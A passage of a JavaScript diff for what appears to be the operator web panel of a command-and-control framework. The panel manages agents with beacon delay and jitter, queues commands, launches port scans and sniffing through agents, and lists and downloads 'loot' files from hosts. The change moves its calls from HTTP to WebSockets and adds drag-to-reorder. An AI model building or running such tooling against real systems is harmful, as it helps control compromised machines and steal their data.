-                '<button id="msg-close-btn" type="button" style="position:absolute;right:10px;top:5px;z-index:10002;width:28px;height:28px;border-radius:50%;background:#f44336;color:#fff;border:none;display:flex;align-items:center;justify-content:center;font-size:18px;line-height:1;cursor:pointer;box-shadow:0 2px 6px rgba(0,0,0,0.08);transition:background 0.2s;" onmouseover="this.style.background=\'#d32f2f\'" onmouseout="this.style.background=\'#f44336\'">x</button>' +
+                '<button id="msg-close-btn" class="dialog-close-btn" type="button">×</button>' +
                 '<div style="display: flex; align-items: center; margin-top:32px;">' +
                     '<h2>Msg list</h2>' +
                     "<p id='hostname' style='margin-left: 25px;'>Host:" + host + "</p>" +
@@ -1131,64 +1941,93 @@ class index{
                 ".btn-group {position: absolute; right: 10px; top: 10px;}" +
                 ".move-btn, .del-btn {margin-left: 5px; padding: 4px 6px; font-size: 14px;}" +
                 ".msg-item span {user-select: none;}" +
-                ".msg-item span[title] {color: blue; text-decoration: underline dotted;}";
+                ".msg-item span[title] {color: blue; text-decoration: underline dotted;}" +
+                ".msg-item-dragging {opacity: 0.92; box-shadow: 0 14px 32px rgba(0,0,0,0.14); z-index: 10020;}" +
+                ".msg-drag-handle {margin-right: 6px; padding: 2px 6px; border: 1px solid #d7dde5; background: #f7f9fc; border-radius: 8px; cursor: grab; touch-action: none; color: #6b7b8b;}" +
+                ".msg-drag-handle:active {cursor: grabbing;}" +
+                ".msg-drop-placeholder {border: 1px dashed #9eb3c7; border-radius: 10px; margin-bottom: 8px; background: rgba(228,236,245,0.45);}";
             dialog.appendChild(style);
 
             // 逻辑
             setTimeout(function() {
+                
                 const msgContainer = dialog.querySelector("#msg-container");
-
                 let msgPostArray = [];
+                let activeMessageDrag = null;
 
-                function loadMessages() {
-                    msgContainer.innerHTML = "";
-
-                    fetch("/`+web_route+`?op=getMsgList&uid=" + encodeURIComponent(uid))
-                        .then(res => res.json())
-                        .then(data1 => {
-                            (data1.messages || []).forEach((raw, i) => {
-                                const text = renderMsgText(raw);
-                                msgContainer.appendChild(
-                                    createMessageItem({
-                                        text,
-                                        index: i,
-                                        withMove: true,
-                                        onDelete: div => deleteMsg(div)
-                                    })
-                                );
-                            });
-                            return fetch("/`+web_route+`?op=getMsgPost&uid=" + encodeURIComponent(uid));
-                        })
-                        .then(res => res.json())
-                        .then(data => {
-                            if (!data.messages || data.messages.length === 0) return;
-
-                            msgPostArray = data.messages; // 保存到前端数组
-                            const h2 = document.createElement("h2");
-                            h2.textContent = "result List";
-                            msgContainer.appendChild(h2);
-
-                            data.messages.forEach((raw, idx) => {
-                                const div = createMessageItem({
-                                    text: raw,
-                                    expandable: true,
-                                    withCopy: true,
-                                    onDelete: div => {
-                                        const realIndex = msgPostArray.indexOf(raw);
-                                        if (realIndex !== -1) {
-                                            msgPostArray.splice(realIndex, 1);
-                                        }
-                                        fetch(
-                                            "/`+web_route+`?op=delMsgMap&uid=" +
-                                            encodeURIComponent(uid) + "&index=" + realIndex
-                                        ).then(() => div.remove());
+                async function loadMessages(){
+                    try{
+                        msgContainer.innerHTML="";
+                        const requestList = document.createElement("div");
+                        requestList.id = "msg-request-list";
+                        msgContainer.appendChild(requestList);
+                        const listData = Array.isArray(msgQueues[uid]) ?
+                            msgQueues[uid] :
+                            [];
+                        listData.forEach((raw,i)=>{
+                            const text =
+                                renderMsgText(raw);
+                            requestList.appendChild(
+                                createMessageItem({
+                                    text:text,
+                                    index:i,
+                                    rawMessage:raw,
+                                    sourceIndex:i,
+                                    withMove:true,
+                                    onDelete:div=>deleteMsg(div)
+                                })
+                            );
+                        });
+                        const postData = Array.isArray(resultQueues[uid]) ?
+                            resultQueues[uid] :
+                            [];
+                        if(postData.length===0){
+                            return;
+                        }
+                        msgPostArray = postData.slice();
+                        let h2=document.createElement("h2");
+                        h2.textContent="result List";
+                        msgContainer.appendChild(h2);
+                        postData.forEach(raw=>{
+                            const div=createMessageItem({
+                                text:raw,
+                                expandable:true,
+                                withCopy:true,
+                                onDelete:async div=>{
+                                    let realIndex =
+                                        msgPostArray.indexOf(raw);
+                                    if(realIndex!==-1){
+                                        msgPostArray.splice(
+                                            realIndex,
+                                            1
+                                        );
                                     }
-                                });
-                                msgContainer.appendChild(div);
+                                    await webSocketClient.send(
+                                        
+                                        "delMsgMap",
+                                        {
+                                            uid:uid,
+                                            index:String(realIndex)
+                                        }
+                                    );
+                                    div.remove();
+                                    customLog("Result deleted");
+                                }
                             });
-                        })
-                        .catch(console.error);
+                            msgContainer.appendChild(div);
+                        });
+                    }catch(err){
+                        console.error(
+                            "load messages error:",
+                            err
+                        );
+                    }
                 }
+                loadMessages();
+                let msgTimer=setInterval(
+                    loadMessages,
+                    10000
+                );
                 function renderMsgText(rawMsg) {
 				    let taskId = "";
 				    let msgContent = rawMsg;
@@ -1247,6 +2086,8 @@ class index{
                 function createMessageItem({
                     text,
                     index = null,
+                    rawMessage = "",
+                    sourceIndex = null,
                     expandable = false,
                     onDelete = null,
                     withMove = false,
@@ -1254,15 +2095,41 @@ class index{
                 }) {
                     const msgDiv = document.createElement("div");
                     msgDiv.className = "msg-item";
+                    if (withMove) {
+                        msgDiv.dataset.reorderable = "true";
+                    }
+                    if (rawMessage !== null && rawMessage !== undefined) {
+                        msgDiv.dataset.rawMessage = rawMessage;
+                    }
+                    if (sourceIndex !== null && sourceIndex !== undefined) {
+                        msgDiv.dataset.sourceIndex = String(sourceIndex);
+                    }
                     msgDiv.style.display = "flex";
                     msgDiv.style.justifyContent = "space-between";
                     msgDiv.style.alignItems = "center";
                     msgDiv.style.gap = "8px";
                 
                     const left = document.createElement("div");
+                    left.style.display = "flex";
+                    left.style.alignItems = "center";
+                    left.style.gap = "8px";
+                    left.style.flex = "1";
+                
+                    if (withMove) {
+                        const handle = document.createElement("button");
+                        handle.type = "button";
+                        handle.className = "msg-drag-handle";
+                        handle.textContent = "⋮⋮";
+                        handle.title = "Drag to reorder";
+                        handle.addEventListener("pointerdown", function(event) {
+                            startMessageDrag(msgDiv, handle, event);
+                        });
+                        left.appendChild(handle);
+                    }
                 
                     if (index !== null) {
                         const idx = document.createElement("span");
+                        idx.className = "msg-index";
                         idx.textContent = "[" + String(index).padStart(2, "0") + "] ";
                         left.appendChild(idx);
                     }
@@ -1289,19 +2156,6 @@ class index{
                     btnGroup.style.display = "flex";
                     btnGroup.style.gap = "4px";
                 
-                    if (withMove) {
-                        const up = document.createElement("button");
-                        up.textContent = "↑";
-                        up.onclick = () => moveUp(msgDiv);
-                
-                        const down = document.createElement("button");
-                        down.textContent = "↓";
-                        down.onclick = () => moveDown(msgDiv);
-                
-                        btnGroup.appendChild(up);
-                        btnGroup.appendChild(down);
-                    }
-                
                     if (withCopy) {
                         const copy = document.createElement("button");
                         copy.textContent = "📋";
@@ -1325,65 +2179,200 @@ class index{
                     return msgDiv;
                 }
 
-                // 上移
-                function moveUp(msgDiv) {
-                    const prev = msgDiv.previousElementSibling;
-                    if (!prev) return;
-
-                    // 先发请求，再改 DOM
-                    sendReorder(msgDiv, prev, "before")
-                        .then(() => {
-                            msgContainer.insertBefore(msgDiv, prev);
-                        })
-                        .catch(console.error);
+                function getRequestList() {
+                    return dialog.querySelector("#msg-request-list");
                 }
 
-                // 下移
-                function moveDown(msgDiv) {
-                    const next = msgDiv.nextElementSibling;
-                    if (!next) return;
+                function getReorderItems() {
+                    const requestList = getRequestList();
+                    if (!requestList) {
+                        return [];
+                    }
+                    return Array.from(
+                        requestList.querySelectorAll('.msg-item[data-reorderable="true"]')
+                    );
+                }
 
-                    // 先发请求，再改 DOM
-                    sendReorder(msgDiv, next, "after")
-                        .then(() => {
-                            msgContainer.insertBefore(next, msgDiv);
-                        })
-                        .catch(console.error);
+                function refreshMessageIndexes() {
+                    getReorderItems().forEach(function(item, index) {
+                        const idx = item.querySelector(".msg-index");
+                        if (idx) {
+                            idx.textContent = "[" + String(index).padStart(2, "0") + "] ";
+                        }
+                        item.dataset.sourceIndex = String(index);
+                    });
+                    msgQueues[uid] = getReorderItems().map(function(item) {
+                        return item.dataset.rawMessage || "";
+                    });
+                }
+
+                function startMessageDrag(msgDiv, handle, event) {
+                    const requestList = getRequestList();
+                    const items = getReorderItems();
+                    if (!requestList || items.length <= 1 || activeMessageDrag) {
+                        return;
+                    }
+                    event.preventDefault();
+                    event.stopPropagation();
+
+                    const rect = msgDiv.getBoundingClientRect();
+                    const placeholder = document.createElement("div");
+                    placeholder.className = "msg-drop-placeholder";
+                    placeholder.style.height = rect.height + "px";
+
+                    const startIndex = items.indexOf(msgDiv);
+                    requestList.insertBefore(placeholder, msgDiv.nextSibling);
+                    document.body.appendChild(msgDiv);
+                    msgDiv.classList.add("msg-item-dragging");
+                    msgDiv.style.position = "fixed";
+                    msgDiv.style.left = rect.left + "px";
+                    msgDiv.style.top = rect.top + "px";
+                    msgDiv.style.width = rect.width + "px";
+                    msgDiv.style.pointerEvents = "none";
+
+                    activeMessageDrag = {
+                        item: msgDiv,
+                        handle: handle,
+                        placeholder: placeholder,
+                        requestList: requestList,
+                        startIndex: startIndex,
+                        offsetX: event.clientX - rect.left,
+                        offsetY: event.clientY - rect.top,
+                    };
+
+                    document.addEventListener("pointermove", onMessageDragMove);
+                    document.addEventListener("pointerup", stopMessageDrag);
+                    document.body.style.userSelect = "none";
+                }
+
+                function onMessageDragMove(event) {
+                    if (!activeMessageDrag) {
+                        return;
+                    }
+                    event.preventDefault();
+                    const drag = activeMessageDrag;
+                    drag.item.style.left = (event.clientX - drag.offsetX) + "px";
+                    drag.item.style.top = (event.clientY - drag.offsetY) + "px";
+
+                    const siblings = Array.from(
+                        drag.requestList.querySelectorAll('.msg-item[data-reorderable="true"]')
+                    );
+                    let inserted = false;
+                    for (const sibling of siblings) {
+                        const rect = sibling.getBoundingClientRect();
+                        if (event.clientY < rect.top + rect.height / 2) {
+                            drag.requestList.insertBefore(drag.placeholder, sibling);
+                            inserted = true;
+                            break;
+                        }
+                    }
+                    if (!inserted) {
+                        drag.requestList.appendChild(drag.placeholder);
+                    }
+                }
+
+                async function stopMessageDrag() {
+                    if (!activeMessageDrag) {
+                        return;
+                    }
+                    const drag = activeMessageDrag;
+                    activeMessageDrag = null;
+                    document.removeEventListener("pointermove", onMessageDragMove);
+                    document.removeEventListener("pointerup", stopMessageDrag);
+                    document.body.style.userSelect = "";
+
+                    const requestChildren = Array.from(drag.requestList.children);
+                    const placeholderIndex = requestChildren.indexOf(drag.placeholder);
+                    const prevItem = drag.placeholder.previousElementSibling;
+                    const nextItem = drag.placeholder.nextElementSibling;
+
+                    drag.requestList.insertBefore(drag.item, drag.placeholder);
+                    drag.placeholder.remove();
+                    drag.item.classList.remove("msg-item-dragging");
+                    drag.item.style.position = "";
+                    drag.item.style.left = "";
+                    drag.item.style.top = "";
+                    drag.item.style.width = "";
+                    drag.item.style.pointerEvents = "";
+
+                    try {
+                        if (placeholderIndex !== drag.startIndex) {
+                            if (nextItem && nextItem.dataset.reorderable === "true") {
+                                await sendReorderByIndex(
+                                    drag.startIndex,
+                                    Number(nextItem.dataset.sourceIndex || "0"),
+                                    "before"
+                                );
+                            } else if (prevItem && prevItem.dataset.reorderable === "true") {
+                                await sendReorderByIndex(
+                                    drag.startIndex,
+                                    Number(prevItem.dataset.sourceIndex || "0"),
+                                    "after"
+                                );
+                            }
+                        }
+                        refreshMessageIndexes();
+                    } catch (err) {
+                        console.error("drag reorder failed:", err);
+                        loadMessages();
+                    }
                 }
 
                 // 删除
-                function deleteMsg(msgDiv) {
-                    const idx = Array.from(msgContainer.children).indexOf(msgDiv);
-                    if (idx < 0) return;
-
-                    const url = "/`+web_route+`?op=delMsgGet&uid=" + encodeURIComponent(uid) + "&index=" + idx;
-                    fetch(url, { method: "GET" })
-                        .then(() => msgDiv.remove())
-                        .catch(console.error);
-                }
-
-                // 发送 reorder 请求（支持 before / after）
-                function sendReorder(sourceDiv, targetDiv, mode) {
-                    const children = Array.from(msgContainer.children);
-                    const s_id = children.indexOf(sourceDiv);
-                    const t_id = children.indexOf(targetDiv);
-                    if (s_id === -1 || t_id === -1) return Promise.reject("invalid dom index");
-                    let pos;
-                    if (mode === "before") {
-                        pos = t_id;        // 插到 target 前面
-                    } else {
-                        pos = t_id + 1;    // 插到 target 后面
+                async function deleteMsg(msgDiv) {
+                    const requestList = getRequestList();
+                    const idx = requestList ?
+                        Array.from(requestList.children).indexOf(msgDiv) :
+                        -1;
+                    if(idx < 0){
+                        return;
                     }
-                    const url = "/`+web_route+`?op=changeMsh&uid=" + encodeURIComponent(uid) +
-                                "&s_id=" + s_id + "&pos=" + pos;
-                    return fetch(url, { method: "GET" })
-                        .then(res => res.json())
-                        .then(data => {
-                            if (data.code !== 200) {
-                                return Promise.reject(data.message || "reorder failed");
+                    try{
+                        await webSocketClient.send(
+                            
+                            "delMsgGet",
+                            {
+                                uid: uid,
+                                index: String(idx)
                             }
-                            return data;
-                        });
+                        );
+                        msgDiv.remove();
+                        refreshMessageIndexes();
+                        customLog("Message deleted");
+                    }catch(err){
+                        console.error("delete msg error:",err);
+                    }
+                }
+                // 发送 reorder 请求（支持 before / after）
+                async function sendReorderByIndex(s_id,t_id,mode){
+                    if(
+                        s_id === -1 ||
+                        t_id === -1
+                    ){
+                        throw new Error("invalid dom index");
+                    }
+                    let pos;
+                    if(mode==="before"){
+                        pos=t_id;
+                    }else{
+                        pos=t_id+1;
+                    }
+                    try{
+                        let data =
+                            await webSocketClient.send(
+                                
+                                "changeMsh",
+                                {
+                                    uid:uid,
+                                    s_id:String(s_id),
+                                    pos:String(pos)
+                                }
+                            );
+                        return data;
+                    }catch(err){
+                        console.error("reorder failed:",err);
+                        throw err;
+                    }
                 }
                 loadMessages();
                 dialog._msgInterval = setInterval(loadMessages, 30000);
@@ -1393,59 +2382,59 @@ class index{
                 });
             }, 200);
         }
-        saveInfo(uid) {
+        async saveInfo(uid) {
             const remarks = document.getElementById('remarks_' + uid).value;
             const delay = document.getElementById('delay_' + uid).value;
             const jitter = document.getElementById('jitter_' + uid).value;
             const username = document.getElementById('username_' + uid).value;
-            fetch("/`+web_route+`?op=change", {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    remarks: remarks,
-                    delay: delay,
-                    jitter: jitter,
-                    username: username,
-                    uid: uid,
-                    taskid: TaskId
-                })
-            })
-            .then(response => response.text())
-            .then(data => {
-                if (data === 'confirm') {
-                    console.log("Changes saved!");
-                    const userIndex = this.User_data.findIndex(client => client.uid === uid);
-                    if (userIndex !== -1) {
-                        this.User_data[userIndex].remarks = remarks;
-                        this.User_data[userIndex].delay = delay;
-                        this.User_data[userIndex].jitter = jitter;
-                        this.User_data[userIndex].username = username;
+            try{
+                let result = await webSocketClient.send(
+                    
+                    "change",
+                    {
+                        remarks: remarks,
+                        delay: delay,
+                        jitter: jitter,
+                        username: username,
+                        uid: uid,
+                        taskid: AgentTaskId
                     }
-                    this.updateUserUI(uid, remarks, delay, username, jitter);
-                } else {
-                    let new_user = document.getElementById('username_' + uid).value;
-                    if(new_user){
-                        let change_url = "/`+web_route+`?op=confirm&uid=" + uid + "&username=" + new_user;
-                        fetch(change_url)
-                            .then(response => response.json())
-                            .then(clients => {
-                                const userIndex = this.User_data.findIndex(client => client.uid === uid);
-                                if (userIndex !== -1) {
-                                    this.User_data[userIndex].remarks = remarks;
-                                    this.User_data[userIndex].delay = delay;
-                                    this.User_data[userIndex].username = username;
-                                    this.User_data[userIndex].jitter = jitter;
-                                }
-                                this.updateUserUI(uid, remarks, delay, username, jitter);
-                            });
-                    }
+                );
+                // change 成功
+                this.updateUserData(
+                    uid,
+                    remarks,
+                    delay,
+                    username,
+                    jitter
+                );
+            }catch(err){
+                console.log("change failed:",err.message);
+                let new_user =document.getElementById('username_' + uid).value;
+                if(!new_user){
+                    return;
                 }
-            })
-            .catch(error => {
-                console.error("Error saving changes:", error);
-            });
+                try{
+                    let client = await webSocketClient.send(
+                        
+                        "confirm",
+                        {
+                            uid:uid,
+                            username:new_user
+                        }
+                    );
+                    const userIndex =User_data.findIndex(client=>client.uid===uid);
+                    if(userIndex!==-1){
+                        User_data[userIndex].remarks =remarks;
+                        User_data[userIndex].delay =delay;
+                        User_data[userIndex].username =username;
+                        User_data[userIndex].jitter =jitter;
+                    }
+                    this.updateUserUI(uid,remarks,delay,username,jitter);
+                }catch(e){
+                    console.error("confirm error:",e);
+                }
+            }
         }
         updateUserUI(uid, remarks, delay, username, jitter) {
             document.getElementById('remarks_' + uid).value = remarks;
@@ -1453,152 +2442,216 @@ class index{
             document.getElementById('username_' + uid).value = username;
             document.getElementById('jitter_' + uid).value = jitter;
         }
-        checkTime() {
-            if (this.username) {
-                let check_url = "/`+web_route+`?op=checkTime&username=" + this.username;
-                setInterval(() => {
-                    fetch(check_url)
-                        .then(response => {
-                            if (response.ok && response.headers.get('Content-Type').includes('application/json')) {
-                                return response.json();
-                            } else {
-                                throw new Error("Invalid JSON response");
-                            }
-                        })
-                        .then(data => {
-                            this.check_time.forEach(item => {
-                                let userDiv = document.getElementById(item.uid + "info");
-                                if (userDiv) {
-                                    let imgElement = document.getElementById(item.uid + "-img");
-                                    let checkElement = document.getElementById(item.uid + "-check");
-                                    if (imgElement) {
-                                        if (item.checkTime !== data.find(i => i.uid === item.uid)?.checkTime) {
-                                            imgElement.outerHTML = '<img class="ip-address" id="' + item.uid + '-img" src="rhythm.gif" style="width: 106px; height: 46px; display: inline-block; vertical-align: middle;"/>';
-                                        } else {
-                                            imgElement.outerHTML = '<div class="ip-address" id="' + item.uid + '-img" style="background-color: #8B4513; width: 106px; height: 1px; display: inline-block; vertical-align: middle; position: relative;"><div style="position: absolute; top: 0; left: 0; right: 0; bottom: 0; box-shadow: inset 0 0 0 106px #8B4513;"></div></div>';
-                                        }
-                                    }
-                                    checkElement.innerText = item.checkTime;
-                                }
-                            });
-                            console.log(this.check_time,data);
-                            this.check_time = data;
-                        })
-                        .catch(error => {
-                            console.error("Error fetching data:", error);
-                        });
-                }, 5000);
+
+        async checkTime() {
+            if(!check_time ||!Array.isArray(check_time) ||check_time.length === 0){
+                console.log("check_time is empty");
+                return;
             }
-        }
-        del(shell) {
-            let right = confirm('Confirm to remove?');
-            if (right) {
-                fetch("/`+web_route+`?op=delInfo&uid=" + shell)
-                    .then(response => response.text())
-                    .then(data => {
-                        alert(data);
-                        this.User_data = this.User_data.filter(user => user.uid !== shell);
-                        const userDiv = document.getElementById(shell + "info");
-                        if (userDiv) {
-                            userDiv.remove();  // 删除对应的 div 元素
+            check_time.forEach(item=>{
+                let userDiv =document.getElementById(item.uid + "info");
+                if(userDiv){
+                    let imgElement = document.getElementById(item.uid + "-img");
+                    let checkElement =document.getElementById(item.uid + "-check");
+                    let previousTime =
+                        userDiv.dataset.lastCheckTime ||
+                        (checkElement ? checkElement.innerText.trim() : "");
+                    let hasChanged =
+                        previousTime !== "" &&
+                        previousTime !== item.checkTime;
+                    if(imgElement){
+                        if(hasChanged){
+                            imgElement.outerHTML = '<img class="ip-address" id="' + item.uid + '-img" src="rhythm.gif" style="width: 106px; height: 46px; display: inline-block; vertical-align: middle;"/>';
+                        } else {
+                            imgElement.outerHTML = '<div class="ip-address" id="' + item.uid + '-img" style="background-color: #8B4513; width: 106px; height: 1px; display: inline-block; vertical-align: middle; position: relative;"><div style="position: absolute; top: 0; left: 0; right: 0; bottom: 0; box-shadow: inset 0 0 0 106px #8B4513;"></div></div>';
                         }
-                    })
-                    .catch(error => console.error("Error:", error));
+                    }
+                    if(checkElement){
+                        checkElement.innerText =item.checkTime;
+                    }
+                    userDiv.dataset.lastCheckTime = item.checkTime;
+                }
+            });
+            console.log(check_time);
+        }
+        async del(uid){
+            let right = await customConfirm("confirm?");
+            if(right){
+                document
+                .getElementById("container-"+uid)
+                ?.remove();
+        
+                webSocketClient.send(
+                    "delIndex",
+                    {
+                        uid: uid
+                    }
+                );
             }
         }
-    async getloot() {
-        const lootFileDiv = document.getElementById('g_file');
-        // 每隔 5 秒自动发送请求
-        setInterval(async () => {
-            try {
-                let response = await fetch("/`+web_route+`?op=getFile&username=" + this.username);
-                if (!response.ok) {
-                    throw new Error("Failed to fetch loot");
-                }
-                let lootHTML = await response.text();
-                lootFileDiv.innerHTML = lootHTML;  // 更新页面内容
-            } catch (error) {
-                console.error("Error fetching loot:", error);
+    loothander(data){
+        const lootDiv = document.getElementById("g_file");
+        if(!lootDiv){
+            return;
+        }
+        lootDiv.classList.add("loot-list");
+        lootDiv.innerHTML = "";
+        if(!Array.isArray(data) || data.length === 0){
+            lootDiv.textContent = "No loot available";
+            lootDiv.classList.add("loot-empty-state");
+            return;
+        }
+        lootDiv.classList.remove("loot-empty-state");
+
+        data.forEach((entry)=>{
+            const uid = entry.uid || "";
+            const host = entry.host || "";
+            const files = Array.isArray(entry.files) ? entry.files : [];
+
+            const card = document.createElement("div");
+            card.className = "loot-card";
+
+            const title = document.createElement("div");
+            title.className = "loot-card-title";
+            title.innerHTML =
+                "<strong>Host:</strong> " + host +
+                " <span class='loot-card-uid'><strong>UID:</strong> " + uid + "</span>";
+            card.appendChild(title);
+
+            if(files.length === 0){
+                const empty = document.createElement("div");
+                empty.className = "loot-empty";
+                empty.textContent = "No files";
+                card.appendChild(empty);
+                lootDiv.appendChild(card);
+                return;
             }
-        }, 5000);  // 5000 毫秒 = 5 秒
+
+            files.forEach((file)=>{
+                const row = document.createElement("div");
+                row.className = "loot-row";
+
+                const info = document.createElement("div");
+                info.className = "loot-info";
+                const name = file.name || "";
+                const size = typeof file.size === "number" ? file.size : 0;
+                const modTime = file.mod_time || "";
+                info.innerHTML =
+                    "<div class='loot-file-name'><strong>" + name + "</strong></div>" +
+                    "<div class='loot-meta'>size: " + size +
+                    " | modified: " + modTime + "</div>";
+
+                const btn = document.createElement("button");
+                btn.type = "button";
+                btn.className = "loot-download-btn";
+                btn.textContent = "Download";
+                btn.onclick = () => {
+                    this.downloadLoot(uid, name);
+                };
+
+                row.appendChild(info);
+                row.appendChild(btn);
+                card.appendChild(row);
+            });
+
+            lootDiv.appendChild(card);
+        });
     }
-    
+    async downloadLoot(uid,file){
+        try{
+            await webSocketClient.downloadFile(
+                "download_loot",
+                {
+                    uid: uid,
+                    file: file
+                }
+            );
+        }catch(err){
+            console.error(
+                "download loot error:",
+                err
+            );
+            customLog("Download failed");
+        }
+    }
 }
 class lain_net{
-    constructor(){
-        this.username = this.getCookie("cookie");
-        this.shell_list=[];
-    }
-    
-    getCookie(name) {
-        let cookies = document.cookie.split('; ');
-        for (let i = 0; i < cookies.length; i++) {
-            let cookie = cookies[i];
-            let cookieParts = cookie.split('=');
-            if (cookieParts[0] === name) {
-                return cookieParts[2];
+    async requestNetData(uid = null) {
+        const shellSelect = document.getElementById("net_shell");
+        uid = uid || (shellSelect ? shellSelect.value : "");
+        if (!uid) {
+            this.renderNetList([], "");
+            this.getshellip([], "");
+            return false;
+        }
+        const sent = await webSocketClient.send(
+            "getNetdata",
+            {
+                uid: uid
             }
+        );
+        if (!sent) {
+            customLog("Get network data failed");
+            return false;
         }
-        return null;
+        return true;
     }
-    
-    async getNet() {
-        // 定时发送请求
-        try {
-            setInterval(async () => {
-                var uid = document.getElementById('net_shell').value;
-                if (uid) {
-                    await fetch("/`+web_route+`?op=net_getresults&uid=" + uid);
-                    let net_json = await fetch("/`+web_route+`?op=getInnet&uid=" + uid);
-                    let text = await net_json.text();
-                    console.log("Response Text:", text);
-                    let net_data;
-                    try {
-                        net_data = JSON.parse(text);
-                    } catch (e) {
-                        return;
-                    }
-                    let net = document.getElementById('net_div');
-                    net.innerHTML = ''; 
-                    net_data.forEach(item => {
-                        let div = document.createElement('div');
-                        div.classList.add("net_div_son");
-                        div.style.display = 'flex'; 
-                        div.style.justifyContent = 'space-between';
-                        let contentDiv = document.createElement('div');
-                        contentDiv.innerHTML = "<strong></strong>" + item.target + "<br>";
-                        // 添加空值检查和数组类型检查
-                        if (Array.isArray(item.shell_innet) && item.shell_innet.length > 0) {
-                            let innetDiv = document.createElement('div');
-                            let sanitizedText = item.shell_innet.join(',\n');
-                            sanitizedText = sanitizedText.replace(/\{\{\{([^}]+)\}\}\}/g, function(match, content) {
-                                let escapedContent = content.replace(/[\s\S]/g, function(char) {
-                                    return '\\u' + ('0000' + char.charCodeAt(0).toString(16)).slice(-4);
-                                });
-                                // 返回替换后的内容，保持外面的大括号
-                                return escapedContent;
-                            });
-                            sanitizedText = "<strong>" + sanitizedText + "</strong>";
-                            innetDiv.innerHTML = sanitizedText;
-                            contentDiv.appendChild(innetDiv);
-
-                        }
-                        div.appendChild(contentDiv);
-                        let button = document.createElement('button');
-                        button.onclick = () => this.del_net(item.target, uid);
-                        button.textContent = 'remove';
-                        button.style.marginLeft = 'auto';
-                        div.appendChild(button);
-                        net.appendChild(div);
-                    });
-                }
-            }, 5000);
-        } catch (error) {
-            console.error('Error in getNet:', error);
+    renderNetList(net_data = [], uid = null) {
+        const netDiv = document.getElementById("net_div");
+        if (!netDiv) {
+            return;
         }
+        netDiv.innerHTML = "";
+        if (!Array.isArray(net_data) || net_data.length === 0) {
+            return;
+        }
+
+        net_data.forEach((item) => {
+            if (!item) {
+                return;
+            }
+            const row = document.createElement("div");
+            row.className = "net_div_son";
+            row.style.display = "flex";
+            row.style.justifyContent = "space-between";
+            row.style.alignItems = "flex-start";
+            row.style.gap = "12px";
+
+            const contentDiv = document.createElement("div");
+            contentDiv.style.flex = "1";
+
+            const target = item.target || "";
+            const title = document.createElement("div");
+            title.textContent = target || "";
+            contentDiv.appendChild(title);
+
+            if (Array.isArray(item.shell_innet) && item.shell_innet.length > 0) {
+                const innetDiv = document.createElement("div");
+                innetDiv.textContent = item.shell_innet.join(", ");
+                contentDiv.appendChild(innetDiv);
+            }
+
+            row.appendChild(contentDiv);
+
+            if (uid && target) {
+                const button = document.createElement("button");
+                button.type = "button";
+                button.textContent = "remove";
+                button.onclick = () => {
+                    this.del_net(target, uid);
+                };
+                row.appendChild(button);
+            }
+
+            netDiv.appendChild(row);
+        });
     }
     async scan(){
         var uid = document.getElementById('net_shell').value;
+        if (!uid) {
+            customLog("Please select an agent");
+            return false;
+        }
         let optionValue = document.getElementById('net_options').value; //选项
         let targetValue = document.getElementById('net_target').value; //目标
         let targetListValue = document.getElementById('net_target_list').value; //探测范围
@@ -1620,225 +2673,420 @@ class lain_net{
             var cmd="GET_PORTS*//*"+targetValue+"*//*"+targetListValue+"*//*"+sleepTimeValue;
         }else if(optionValue === "sniff"){
             var cmd="GET_U_FRIENDS*//*"+targetValue+"*//*"+targetListValue+"*//*"+sleepTimeValue;
+        } else {
+            customLog("Please select scan type");
+            return false;
         }
-        await fetch("/`+web_route+`?op=msg&uid="+uid+"&msg="+encodeURIComponent(cmd)+"&Taskid=scanTask");
+        const sent = await webSocketClient.send(
+            "msg",
+            {
+                uid:uid,
+                msg:cmd,
+                Taskid:AgentTaskId
+            }
+        );
+        if (!sent) {
+            customLog("Send failed");
+            return false;
+        }
+        return true;
     }
-    del_net(target,uid){
-        fetch("/`+web_route+`?op=delShellInnet&uid="+uid+"&target="+target)
+    async del_net(target, uid){
+        try {
+            let result = await webSocketClient.send(
+                
+                "delShellInnet",
+                {
+                    uid: uid,
+                    target: target
+                }
+            );
+            console.log("delete shell innet:",result);
+        } catch(err){
+            console.error("del shell innet error:",err);
+        }
     }
-    async getshellip(){
-        var uid = document.getElementById('net_shell').value;
-        let shell_ip_json = await fetch("/`+web_route+`?op=getShellInnet&uid="+uid);
-        let shell_ip_str = await shell_ip_json.text();  // 获取到的依然是字符串
-        let shell_ip_list = shell_ip_str.split(',');  // 将逗号分隔的字符串转换为数组
-        let have_ip_div = document.getElementById('have_ip');
-        have_ip_div.innerHTML="";
-        let cur_div = document.createElement('div');
-        cur_div.textContent='Host net:';
-        have_ip_div.appendChild(cur_div);
-        shell_ip_list.forEach(item => {
-            let div = document.createElement('div');
-            div.innerHTML = "IP:"+item+"\t";  // 将每个IP显示在新的行中
-            have_ip_div.appendChild(div);
-        });
+    getshellip(shell_ip_data = null, uid = null){
+        if (!uid) {
+            const shellSelect = document.getElementById("net_shell");
+            uid = shellSelect ? shellSelect.value : "";
+        }
+        try {
+            if (!uid) {
+                return;
+            }
+    
+            if (shell_ip_data === null || typeof shell_ip_data === "undefined") {
+                shell_ip_data =
+                    (window.shellInnetData && window.shellInnetData[uid]) ||
+                    [];
+            }
+    
+            let shell_ip_list = [];
+            if (Array.isArray(shell_ip_data)) {
+                shell_ip_list = shell_ip_data;
+            } else if (typeof shell_ip_data === "string") {
+                shell_ip_list = shell_ip_data.split(",");
+            } else if (shell_ip_data && typeof shell_ip_data === "object") {
+                shell_ip_list = Object.values(shell_ip_data);
+            } else if (shell_ip_data !== null && shell_ip_data !== undefined) {
+                shell_ip_list = [String(shell_ip_data)];
+            }
+    
+            const have_ip_div = document.getElementById("have_ip");
+            if (!have_ip_div) {
+                return;
+            }
+    
+            have_ip_div.innerHTML = "";
+    
+            let cur_div = document.createElement("div");
+            cur_div.textContent = "Host net:";
+            have_ip_div.appendChild(cur_div);
+    
+            shell_ip_list.forEach(item => {
+                if (!item) {
+                    return;
+                }
+                let div = document.createElement("div");
+                div.textContent = "IP: " + item;
+                have_ip_div.appendChild(div);
+            });
+        } catch(err){
+            console.error("get shell ip error:", err);
+        }
     }
 }
 
 class lain_server {
-    constructor() {
-        this.username = this.getCookie("cookie");
-        this.server_data = [];
-        this.server_pulgin = [];
+    getOnlineTeammatesMarkup() {
+        const teamList = Array.isArray(onlineTeammates) ? onlineTeammates : [];
+        const count = teamList.length;
+        const listItems = count > 0 ?
+            teamList.map((user) => {
+                return "<li class='online-teammate-item'>" +
+                    escapeHtml(user) +
